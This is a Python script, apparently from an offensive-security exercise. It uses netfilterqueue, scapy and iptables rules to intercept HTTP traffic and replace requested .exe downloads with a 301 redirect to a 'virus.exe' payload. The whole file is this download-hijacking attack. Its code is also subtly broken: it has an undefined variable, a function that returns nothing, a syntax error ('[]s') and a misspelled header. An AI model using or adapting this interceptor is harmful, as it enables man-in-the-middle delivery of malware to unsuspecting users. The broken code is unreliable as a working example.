import netfilterqueue
import scapy.all as scapy
import subprocess


def set_load(packet,load):
    scapy_packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum


def pre_set_port():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000",shell=True)

ack_list = []s
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet[scapy.TCP].dport == 10000:
        if ".exe" in scapy_packet[scapy.Raw].load:
            print("EXE Request")
            ack_list.append(scapy_packet[scapy.TCP].ack)
            scapy_packet.show()
    elif scapy_packet[scapy.TCP].sport == 10000:
        if scapy_packet[scapy.TCP].seq in ack_list:
            ack_list.remove(scapy_packet[scapy.TCP].seq)
            print("[+] Replacing file")
            modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Pernmanetly\nLocation: https://path/virus.exe\n\n")
            packet.set_payload(str(modified_packet))

    packet.accept()

#pre_set_port()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()